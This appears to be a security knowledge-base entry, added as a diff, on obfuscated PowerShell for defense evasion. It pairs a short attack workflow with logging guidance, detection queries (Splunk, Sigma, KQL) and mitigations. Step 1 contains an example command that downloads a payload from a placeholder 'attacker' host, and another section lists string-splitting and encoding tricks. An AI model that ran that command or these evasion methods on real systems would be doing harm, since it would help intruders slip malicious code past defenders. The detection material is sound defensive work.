@@ -1,0 +1,391 @@
+Obfuscated PowerShell Attack
+- A defense evasion technique where attackers obfuscate PowerShell commands to avoid detection by security tools.
+
+==================================================
+Attack Metadata
+==================================================
+
+Category:
+Post_Exploitation → Defense Evasion
+
+Attack Stage:
+Execution
+Defense Evasion
+
+Difficulty:
+Intermediate → Advanced
+
+Stealth Level:
+High
+
+Requires Authentication:
+Yes (initial access required)
+
+Tools Used:
+PowerShell
+Invoke-Obfuscation
+Custom scripts
+Base64 encoding tools
+
+
+==================================================
+1. Overview
+==================================================
+PowerShell is a powerful scripting language widely used in Windows environments.
+
+Attackers frequently use PowerShell for:
+
+- command execution
+- payload delivery
+- lateral movement
+
+To evade detection, attackers obfuscate PowerShell commands using:
+
+- encoding
+- string manipulation
+- variable substitution
+- command splitting
+
+This makes malicious activity harder to detect by:
+
+- antivirus
+- EDR
+- signature-based tools
+
+
+==================================================
+2. Attack Scenario
+==================================================
+An attacker gains access to a system.
+
+Instead of executing a visible command, the attacker encodes the payload.
+
+The encoded command is executed via PowerShell.
+
+Security tools fail to detect the malicious intent.
+
+
+==================================================
+3. Tools Required
+==================================================
+
+PowerShell
+
+Used for execution and encoding.
+
+Invoke-Obfuscation
+
+Framework for obfuscating commands.
+
+Custom Scripts
+
+Used to generate obfuscated payloads.
+
+
+==================================================
+4. Attack Workflow
+==================================================
+
+Initial Access
+        ↓
+Prepare Payload
+        ↓
+Obfuscate Command
+        ↓
+Execute via PowerShell
+        ↓
+Evade Detection
+
+
+==================================================
+5. Step-by-Step Execution
+==================================================
+Step 1 — Create Payload
+
+Example:
+
+powershell -nop -c "Invoke-WebRequest http://attacker/payload.ps1"
+
+
+Step 2 — Encode Command
+
+Example:
+
+powershell -EncodedCommand <base64_string>
+
+
+Step 3 — Obfuscate Further
+
+Examples:
+
+- string concatenation
+- variable substitution
+- random casing
+
+
+Step 4 — Execute Command
+
+The system executes obfuscated PowerShell without triggering alerts.
+
+
+==================================================
+6. Common Obfuscation Techniques
+==================================================
+
+Base64 Encoding
+
+EncodedCommand parameter.
+
+
+String Splitting
+
+"Inv"+"oke-WebRequest"
+
+
+Variable Substitution
+
+$var="Invoke-WebRequest"
+
+
+Character Encoding
+
+Unicode or ASCII encoding.
+
+
+Randomization
+
+Mixed casing and spacing.
+
+
+==================================================
+7. Example Attack Scenario
+==================================================
+Initial Access
+
+Attacker gains shell.
+
+
+Payload Preparation
+
+PowerShell command created.
+
+
+Obfuscation
+
+Command encoded.
+
+
+Execution
+
+Payload executed undetected.
+
+
+==================================================
+8. Expected Results
+==================================================
+Successful obfuscation allows attackers to:
+
+- evade detection
+- bypass signature-based defenses
+- execute malicious commands stealthily
+
+
+==================================================
+9. Defensive Considerations
+==================================================
+
+PowerShell Logging
+
+Enable script block logging.
+
+Command-Line Monitoring
+
+Detect encoded commands.
+
+Behavioral Detection
+
+Identify suspicious activity.
+
+Application Control
+
+Restrict PowerShell usage.
+
+
+==================================================
+10. MITRE ATT&CK Mapping
+==================================================
+
+Technique:
+T1027 — Obfuscated Files or Information
+
+Technique:
+T1059.001 — PowerShell
+
+
+==================================================
+11. Blue Team Detection
+==================================================
+Indicators include:
+
+- use of -EncodedCommand
+- long Base64 strings
+- unusual PowerShell usage
+- suspicious command-line arguments
+
+Security teams should monitor:
+
+- PowerShell execution logs
+- encoded commands
+- script activity
+
+
+==================================================
+12. Relevant Logs
+==================================================
+
+Windows Event Logs
+
+Event ID 4688 (process creation)  
+
+
+PowerShell Logs
+
+Script block logging  
+
+
+Sysmon Logs
+
+Command-line arguments  
+
+
+==================================================
+13. Detection Tools
+==================================================
+
+EDR Solutions
+
+- Microsoft Defender
+- CrowdStrike
+
+
+SIEM Platforms
+
+- Splunk
+- Elastic Stack
+- Microsoft Sentinel
+
+
+Monitoring Tools
+
+- Sysmon
+
+
+==================================================
+14. SOC Detection Queries
+==================================================
+
+Splunk Query (Encoded PowerShell)
+
+index=windows
+| search powershell AND "-enc"
+
+
+Splunk Query (Long Base64 Strings)
+
+index=windows
+| regex command_line=".{100,}"
+
+
+Sigma Rule Example
+
+title: Suspicious Encoded PowerShell
+logsource:
+  product: windows
+detection:
+  selection:
+    CommandLine: "*-enc*"
+  condition: selection
+level: high
+
+
+Microsoft Sentinel (KQL) Example
+
+SecurityEvent
+| where Process has "powershell"
+| where CommandLine contains "-enc"
+
+
+==================================================
+15. Mitigation Strategies
+==================================================
+
+Enable PowerShell Logging
+
+Capture script activity.
+
+Restrict PowerShell
+
+Limit usage where possible.
+
+Use EDR
+
+Detect behavior, not signatures.
+
+Monitor Command Lines
+
+Detect suspicious patterns.
+
+Implement Application Control
+
+Block unauthorized scripts.
+
+
+==================================================
+16. Attack Chain Integration
+==================================================
+
+This attack commonly occurs during:
+
+- Living Off the Land Attack
+- Initial Access
+- Lateral Movement
+
+This attack may lead to:
+
+- Credential Dumping
+- Persistence Deployment
+- EDR Evasion
+
+
+==================================================
+17. Questions & Answers
+==================================================
+Question:
+What is PowerShell obfuscation?
+
+Answer:
+Hiding malicious commands using encoding or manipulation.
+
+--------------------------------------------------
+
+Question:
+Why is it effective?
+
+Answer:
+It bypasses signature-based detection.
+
+--------------------------------------------------
+
+Question:
+What is a key indicator?
+
+Answer:
+Use of -EncodedCommand.
+
+--------------------------------------------------
+
+Question:
+What is a key defense?
+
+Answer:
+PowerShell logging and behavioral detection.
